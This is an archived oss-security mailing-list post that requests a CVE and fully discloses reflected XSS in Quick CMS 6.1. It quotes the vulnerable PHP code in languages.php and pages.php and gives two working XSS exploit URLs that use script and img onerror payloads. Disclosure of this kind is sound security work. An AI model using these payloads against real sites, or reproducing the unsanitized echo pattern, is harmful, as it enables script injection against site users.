X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1681" "Tuesday" "19" "January" "2016" "16:20:18" "+0530" "Rahul Pratap Singh" "techno.rps@gmail.com" "<CADLX=aFcG44oDaW57ZtFHm3D8e-aqhfRdMU=c0uaKLUCeXjJow@mail.gmail.com>" "57" "[oss-security] CVE Request: Quick CMS v 6.1 XSS Vulnerability" nil nil nil "1" "2016011910:50:18" "[oss-security] CVE Request: Quick CMS v 6.1 XSS Vulnerability" (number mark "U       techno.rps@g Jan 19   57/1681  " thread-indent "\"[oss-security] CVE Request: Quick CMS v 6.1 XSS Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11589 invoked by uid 550); 19 Jan 2016 17:14:58 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19847 invoked from network); 19 Jan 2016 10:50:30 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=VhugPRyre2fYwME7PigPuewsv4K+jQPA2zHhS3Q+1V8=;
        b=hr7wpvRWow8Pf8+z6qdRNJO1/kUXkCZOLXscfRodgB/e9Gf+Do7r/RW3Jr6G+5itgj
         CtqUV/N8ZeRJUXt7cS4zMzy6v9wUfMHVnqEys19M/Tdc9JP7+Szf5XSKwq7fUXUGGjq5
         GEqiMmftqYEBS6yjY7XpwS6RzgjHDoNnrHTIdpTydv1q2tixvKdThIFIg3Cn81VKg+WR
         txmKpgWNM0DEEZ55OnqIFw7SzW7V5PO1O88Vzu5zQo2/n5DYEXVU+jhhiQtq7vgDNlm5
         6c5BC5WGvGWnw8TWJoqxsGp+Tt+rLFySKMu3jww0CpxNPuoxrFx2LiIgKR5IK4GJElPJ
         Kwmw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
         :content-type;
        bh=VhugPRyre2fYwME7PigPuewsv4K+jQPA2zHhS3Q+1V8=;
        b=jhFrmCRVqhJDIK+rnHlODl8sqMy7wPOhkGyrFc6qaToNu4LhBY23wgFVC3kOcbXxi/
         V3feJFYaZ1W7VMFfq6G6XnWglrkJheP+8vOdD0hdK2t/4LPzbJqqwlzKcX9vbnCaDyxR
         fMNTodpyvs6hO6PYtkB5VU75EWVgM9vEZevd3VlA0FUyf15J8DMJsF+ZME/9Nb7cmlcE
         uPWHez/OgYZImh4edVXpgXS3n9/Y99UjNwJ5h7LlVfMYWfUpibzRaovvt15ljjw0iqoA
         iSNTpGvsMoVwYhCnEyZ0DHBqYcNbKQUA3MY2mbBmbGuZIollrMvI7YNPrxIU38CNFH77
         EYdw==
X-Gm-Message-State: ALoCoQlJPEifeG5IFmljEbpHnKD1ExPyhz0WCrS7aKdaBsFr0+gZe04U6e5Y2LhaMKvhwg1o8HTItRwNHjSfcK0fey9dM0J/xw==
MIME-Version: 1.0
X-Received: by 10.107.3.71 with SMTP id 68mr29014205iod.48.1453200618494; Tue,
 19 Jan 2016 02:50:18 -0800 (PST)
Date: Tue, 19 Jan 2016 16:20:18 +0530
Message-ID: <CADLX=aFcG44oDaW57ZtFHm3D8e-aqhfRdMU=c0uaKLUCeXjJow@mail.gmail.com>
From: Rahul Pratap Singh <techno.rps@gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a113eb35ca720900529ada2f8
Subject: [oss-security] CVE Request: Quick CMS v 6.1 XSS Vulnerability

--001a113eb35ca720900529ada2f8
Content-Type: text/plain; charset=UTF-8

## FULL DISCLOSURE

#Product    : Quick CMS
#Version    : 6.1
#Home page Link  : http://opensolution.org/home.html
#Date        : 19/Jan/2016

XSS Vulnerability:

----------------------------------------
Description:
----------------------------------------
 "sLangEdit" and "sSort" parameters are not sanitized that leads to
Reflected XSS.

----------------------------------------
Vulnerable Code:
----------------------------------------
File Name: languages.php

Found at line:23
<h1><?php echo $lang['Languages'].( isset( $_GET['sLangEdit'] ) ? '
'.$_GET['sLangEdit'] : null ); ?></h1>

File Name: pages.php

Found at line:49
<form action="?p=pages<?php if( isset( $_GET['sSort'] ) ) echo
'&amp;sSort='.$_GET['sSort']; ?>" name="form" method="post"
class="main-form">

----------------------------------------
Exploit:
----------------------------------------
localhost/Quick.Cms_v6.1-en/admin.php?p=languages&sLangEdit=</h1><script>alert("XSS")</script><h1>

localhost/Quick.Cms_v6.1-en/admin.php?p=pages&sSort="><img%20src=x%20onerror=confirm(1)><!--

----------------------------------------
POC:
----------------------------------------
https://0x62626262.files.wordpress.com/2016/01/quick-cms-v6-1xsspoc.png
https://0x62626262.files.wordpress.com/2016/01/quick-cms-v6-1xsspoc2.png


Disclosure Timeline:
Tried to contact vendor via email  : 14/1/2016 ( email bounce back)
Tried to contact vendor via forum : 18/1/2016 (thread deleted, no response)
Public Disclosure: 19/1/2016

Pub ref:
https://0x62626262.wordpress.com/2016/01/19/quick-cms-v-6-1-xss-vulnerability

--001a113eb35ca720900529ada2f8--
